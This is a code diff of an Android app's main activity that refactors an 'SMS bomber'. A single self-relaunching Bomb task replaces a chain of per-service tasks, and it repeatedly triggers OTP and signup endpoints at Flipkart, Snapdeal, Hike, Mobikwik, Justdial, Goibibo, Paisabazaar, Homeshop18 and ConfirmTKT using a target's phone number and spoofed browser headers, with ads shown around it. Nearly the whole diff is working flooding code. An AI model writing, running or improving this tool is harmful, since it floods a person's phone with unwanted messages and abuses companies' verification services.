@@ -14,8 +14,6 @@ import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.text.Html;
 import android.text.TextUtils;
-import android.text.method.ScrollingMovementMethod;
-import android.util.Log;
 import android.view.Menu;
 import android.view.MenuInflater;
 import android.view.MenuItem;
@@ -26,9 +24,6 @@ import android.widget.EditText;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 
-import com.afollestad.ason.Ason;
-import com.afollestad.bridge.Bridge;
-import com.afollestad.bridge.BridgeException;
 import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeNoticeDialog;
 import com.awesomedialog.blennersilva.awesomedialoglibrary.interfaces.Closure;
 import com.google.android.gms.ads.AdListener;
@@ -37,7 +32,10 @@ import com.google.android.gms.ads.AdView;
 import com.google.android.gms.ads.InterstitialAd;
 import com.google.android.gms.ads.MobileAds;
 
+import org.json.JSONObject;
+
 import java.io.IOException;
+import java.util.HashMap;
 
 import okhttp3.Call;
 import okhttp3.Callback;
@@ -83,7 +81,6 @@ public class HomeActivity extends AppCompatActivity {
             public void run() {
                 if (interstitialAd.isLoaded()) {
                     interstitialAd.show();
-
                     interstitialAd.loadAd(adRequest);
                 } else {
                     addLog("#FFFF00", "Wait for 10-15 second.");
@@ -110,7 +107,7 @@ public class HomeActivity extends AppCompatActivity {
                 .show();
 
         AdView adView = findViewById(R.id.mainBottomBannerAd);
-        final AdRequest adRequest1 = new AdRequest.Builder().build();
+        AdRequest adRequest1 = new AdRequest.Builder().build();
         adView.loadAd(adRequest1);
 
         AdView adView1 = findViewById(R.id.mainTopBannerAd);
@@ -130,8 +127,6 @@ public class HomeActivity extends AppCompatActivity {
         mLogTV = findViewById(R.id.logTV);
 
         mLog = mLogTV.getText().toString();
-        mLogTV.setMovementMethod(new ScrollingMovementMethod());
-
 
         findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
             @Override
@@ -163,7 +158,7 @@ public class HomeActivity extends AppCompatActivity {
                     return;
                 }
 
-                new SnapdealBomb().execute();
+                new Bomb().execute();
 
             }
         });
@@ -190,8 +185,7 @@ public class HomeActivity extends AppCompatActivity {
 
             @Override
             public void onAdFailedToLoad(int errorCode) {
-                addLog("#FF0000", "Errorcode : " + errorCode);
-                interstitialAd.loadAd(adRequest);
+                addLog("#FF0000", "Error : " + errorCode);
             }
 
             @Override
@@ -231,9 +225,8 @@ public class HomeActivity extends AppCompatActivity {
     }
 
 
-    @SuppressWarnings("UnusedAssignment")
     @SuppressLint("StaticFieldLeak")
-    private class SnapdealBomb extends AsyncTask<Void, Void, Void> {
+    private class Bomb extends AsyncTask<Void, Void, Void> {
 
         @Override
         protected void onPreExecute() {
@@ -247,319 +240,169 @@ public class HomeActivity extends AppCompatActivity {
                 @Override
                 public void run() {
 
-                    Object localObject2 = new Ason();
-                    ((Ason) localObject2).put("firstName", "Popol");
-                    ((Ason) localObject2).put("middleName", "Lopol");
-                    ((Ason) localObject2).put("password", "bomber69");
-                    ((Ason) localObject2).put("requestProtocol", "PROTOCOL_JSON");
-                    ((Ason) localObject2).put("responseProtocol", "PROTOCOL_JSON");
-                    ((Ason) localObject2).put("mobileNumber", mPhoneNumber);
-                    try {
-                        localObject2 = Bridge.post("https://mobileapi.snapdeal.com/service/user/signUpWithMobileOnly"
-                                , new Object[0]).header("v", "6.1.9")
-                                .header("api_key", "snapdeal")
-                                .header("User-Agent", "android")
-                                .body((Ason) localObject2).request().response();
+                    confirmTKT();
+                    mobikwick();
+                    hike();
+                    justdial();
+                    piasabazar();
+                    goibibo();
+                    snapdeal();
+                    homeshop18();
+                    flipkart();
 
-                        final int code = Integer.parseInt(localObject2.toString().substring(0, 3));
+                }
+            });
+            mThread.start();
 
-                        runOnUiThread(new Runnable() {
-                            @Override
-                            public void run() {
-                                if (code == 200) {
-                                    mStatusTV.setText("Snapdeal");
-                                }
-                            }
-                        });
+            return null;
+        }
 
-                    } catch (BridgeException e) {
-                        e.printStackTrace();
+        @Override
+        protected void onPostExecute(Void aVoid) {
+            super.onPostExecute(aVoid);
+            new Bomb().execute();
+
+        }
+    }
+
+    private void flipkart() {
+        OkHttpClient localOkHttpClient = new OkHttpClient();
+        RequestBody localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91" + mPhoneNumber);
+        localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
+
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                mStatusTV.setText("Flipkart");
+            }
+        });
+    }
+
+    private void homeshop18() {
+        OkHttpClient localOkHttpClient1 = new OkHttpClient();
+        RequestBody localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "submit=submit&identity=" + mPhoneNumber + "&otpType=SIGNUP_OTP");
+        localOkHttpClient1.newCall(new Request.Builder().url("https://mbe.homeshop18.com/services/secure/user/generate/otp").post(localRequestBody1).addHeader("x-hs18-app-version", "3.1.0").addHeader("x-hs18-app-id", "0").addHeader("x-hs18-device-version", "25").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("accept-charset", "UTF-8").addHeader("x-hs18-app-platform", "androidApp").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
+
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                mStatusTV.setText("Homeshop18");
+            }
+        });
+    }
+
+    private void snapdeal() {
+        OkHttpClient localOkHttpClient2 = new OkHttpClient();
+        RequestBody localRequestBody2 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "emailId=&mobileNumber=" + mPhoneNumber + "&purpose=LOGIN_WITH_MOBILE_OTP");
+        localOkHttpClient2.newCall(new Request.Builder().url("https://www.snapdeal.com/sendOTP")
+                .post(localRequestBody2).addHeader("host", "www.snapdeal.com")
+                .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
+                .addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5")
+                .addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.snapdeal.com/iframeLogin")
+                .addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest")
+                .addHeader("content-length", "62").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
+
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                mStatusTV.setText("Snapdeal");
+            }
+        });
+    }
+
+    private void goibibo() {
+        OkHttpClient localOkHttpClient3 = new OkHttpClient();
+        RequestBody localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
+        localOkHttpClient3.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
+
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                runOnUiThread(new Runnable() {
+                    @Override
+                    public void run() {
+                        mStatusTV.setText("Goibibo");
                     }
-
-                }
-            });
-
-            mThread.start();
-
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            super.onPostExecute(aVoid);
-            new HikeBomb().execute();
-        }
+                });
+            }
+        });
     }
 
-    @SuppressLint("StaticFieldLeak")
-    private class HikeBomb extends AsyncTask<Void, Void, Void> {
+    private void piasabazar() {
+        OkHttpClient localOkHttpClient11 = new OkHttpClient();
+        RequestBody localRequestBody11 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mobile_number=" + mPhoneNumber + "&step=send_password&request_page=landing");
+        localOkHttpClient11.newCall(new Request.Builder().url("https://myaccount.paisabazaar.com/my-account/").post(localRequestBody11).addHeader("host", "myaccount.paisabazaar.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "application/json, text/javascript, */*; q=0.01").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://myaccount.paisabazaar.com/my-account/").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest").addHeader("content-length", "64").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
 
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                mStatusTV.setText("Paisabazar");
+            }
+        });
+    }
 
-        @Override
-        protected Void doInBackground(Void... voids) {
+    private void justdial() {
+        String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
+        new OkHttpClient().newCall(new Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
 
-            mThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-
-                    Object localObject = new Ason();
-                    ((Ason) localObject).put("method", "pin");
-                    ((Ason) localObject).put("msisdn", "+91".concat(mPhoneNumber));
-                    try {
-                        localObject = Bridge.post("http://api.im.hike.in/v3/account/validate?digits=4").body((Ason) localObject).request().response();
-
-                        final int code = Integer.parseInt(localObject.toString().substring(0, 3));
-
-                        runOnUiThread(new Runnable() {
-                            @Override
-                            public void run() {
-                                mStatusTV.setText("Hike");
-                                if (code == 200) {
-                                    mStatusTV.setText("Snapdeal");
-                                }
-                            }
-                        });
-                    } catch (BridgeException e) {
-                        e.printStackTrace();
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                runOnUiThread(new Runnable() {
+                    @Override
+                    public void run() {
+                        mStatusTV.setText("Justdial");
                     }
-
-                }
-            });
-            mThread.start();
-
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            super.onPostExecute(aVoid);
-            new MobikwickBomb().execute();
-
-        }
+                });
+            }
+        });
     }
 
-    private class MobikwickBomb extends AsyncTask<Void, Void, Void> {
+    private void hike() {
+        MediaType localMediaType0 = MediaType.parse("application/json; charset=utf-8");
+        HashMap localHashMap0 = new HashMap();
+        localHashMap0.put("method", "pin");
+        localHashMap0.put("msisdn", "+91".concat(mPhoneNumber));
+        JSONObject localJSONObject121 = new JSONObject(localHashMap0);
+        OkHttpClient localOkHttpClient121 = new OkHttpClient();
+        RequestBody localRequestBody121 = RequestBody.create(localMediaType0, localJSONObject121.toString());
+        localOkHttpClient121.newCall(new Request.Builder().url("http://api.im.hike.in/v3/account/validate?digits=4").post(localRequestBody121).addHeader("content-type", "application/json; charset=utf-8").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
 
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
-
-        @Override
-        protected Void doInBackground(Void... voids) {
-
-            mThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-
-                    Object localObject1 = new Ason();
-                    ((Ason) localObject1).put("cell", mPhoneNumber);
-                    try {
-                        localObject1 = Bridge.post("https://appapi.mobikwik.com/p/account/otp/cell", new Object[0])
-                                .header("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920I Build/NRD90M")
-                                .header("X-App-Ver", "1")
-                                .header("X-MClient", "3")
-                                .body((Ason) localObject1).request().response();
-
-                        final int code = Integer.parseInt(localObject1.toString().substring(0, 3));
-
-                        if (localObject1.toString() == "200") {
-                            runOnUiThread(new Runnable() {
-                                @Override
-                                public void run() {
-                                    mStatusTV.setText("Mobikwick");
-                                    if (code == 200) {
-                                        mStatusTV.setText("Snapdeal");
-                                    }
-                                }
-                            });
-                        }
-
-                    } catch (BridgeException e) {
-                        e.printStackTrace();
-                    }
-
-                }
-            });
-            mThread.start();
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            super.onPostExecute(aVoid);
-            new ConfirmTktBomb().execute();
-
-        }
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                mStatusTV.setText("Hike");
+            }
+        });
     }
 
-    @SuppressLint("StaticFieldLeak")
-    private class ConfirmTktBomb extends AsyncTask<Void, Void, Void> {
+    private void mobikwick() {
+        MediaType localMediaType001 = MediaType.parse("application/json; charset=utf-8");
+        HashMap localHashMap001 = new HashMap();
+        localHashMap001.put("cell", mPhoneNumber);
+        JSONObject localJSONObject001 = new JSONObject(localHashMap001);
+        OkHttpClient localOkHttpClient001 = new OkHttpClient();
+        RequestBody localRequestBody001 = RequestBody.create(localMediaType001, localJSONObject001.toString());
+        localOkHttpClient001.newCall(new Request.Builder().url("https://appapi.mobikwik.com/p/account/otp/cell").post(localRequestBody001).addHeader("content-type", "application/json").addHeader("User-Agent", "").addHeader("X-App-Ver", "1").addHeader("X-MClient", "1").build()).enqueue(new Callback() {
+            public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+            }
 
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
-
-        @Override
-        protected Void doInBackground(Void... voids) {
-
-            mThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-
-                    runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            WebView webView = new WebView(HomeActivity.this);
-                            webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
-                            webView.setWebViewClient(new WebViewClient());
-                            mStatusTV.setText("ConfirmTKT");
-                        }
-                    });
-
-                }
-            });
-            mThread.start();
-
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            super.onPostExecute(aVoid);
-            new FlipkartBomb().execute();
-
-        }
+            public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
+                mStatusTV.setText("Mobikwik");
+            }
+        });
     }
 
-    @SuppressLint("StaticFieldLeak")
-    private class FlipkartBomb extends AsyncTask<Void, Void, Void> {
-
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
-
-        @Override
-        protected Void doInBackground(Void... voids) {
-
-            mThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-
-                    MediaType localMediaType = MediaType.parse("application/json; charset=utf-8");
-                    OkHttpClient localOkHttpClient = new OkHttpClient();
-                    RequestBody localRequestBody = RequestBody.create(localMediaType, "{\"loginId\":[\"+91" + mPhoneNumber + "\"],\"supportAllStates\":true}");
-                    localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/6/user/signup/status").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/json").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "53").addHeader("connection", "keep-alive").build()).enqueue(new Callback()
-                    {
-                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
-                            addLog("#FF0000","At flipkart: "+paramAnonymousIOException.getLocalizedMessage());
-                        }
-
-                        public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
-                        {}
-                    });
-
-                }
-            });
-            mThread.start();
-
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            super.onPostExecute(aVoid);
-            new JustDileBomb().execute();
-
-        }
-    }
-
-    @SuppressLint("StaticFieldLeak")
-    private class JustDileBomb extends AsyncTask<Void, Void, Void> {
-
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
-
-        @Override
-        protected Void doInBackground(Void... voids) {
-
-            mThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-
-                    String str = "https://www.justdial.com/functions/ajxandroid.php?phn=" + mPhoneNumber + "&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile";
-                    new OkHttpClient().newCall(new Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(new Callback()
-                    {
-                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
-                            addLog("#FF0000","At justdial: "+paramAnonymousIOException.getLocalizedMessage());
-                        }
-
-                        public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
-                        {}
-                    });
-
-                }
-            });
-            mThread.start();
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            super.onPostExecute(aVoid);
-            new GoibiboBomb().execute();
-
-        }
-    }
-
-    @SuppressLint("StaticFieldLeak")
-    private class GoibiboBomb extends AsyncTask<Void, Void, Void> {
-
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
-
-        @Override
-        protected Void doInBackground(Void... voids) {
-
-            mThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-
-                    OkHttpClient localOkHttpClient1 = new OkHttpClient();
-                    RequestBody localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
-                    localOkHttpClient1.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody1).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(new Callback()
-                    {
-                        public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
-                            addLog("#FF0000","At goibibo: "+paramAnonymousIOException.getLocalizedMessage());
-                        }
-
-                        public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse)
-                        {}
-                    });
-
-
-                }
-            });
-            mThread.start();
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void aVoid) {
-            super.onPostExecute(aVoid);
-            new SnapdealBomb().execute();
-
-        }
+    private void confirmTKT() {
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                WebView webView = new WebView(HomeActivity.this);
+                webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
+                webView.setWebViewClient(new WebViewClient());
+                mStatusTV.setText("ConfirmTKT");
+            }
+        });
     }
 
 
@@ -635,7 +478,7 @@ public class HomeActivity extends AppCompatActivity {
             }
             mPhoneNumber = numberT;
             mPhoneEt.setText(numberT);
-            new SnapdealBomb().execute();
+            new Bomb().execute();
 
         }
 
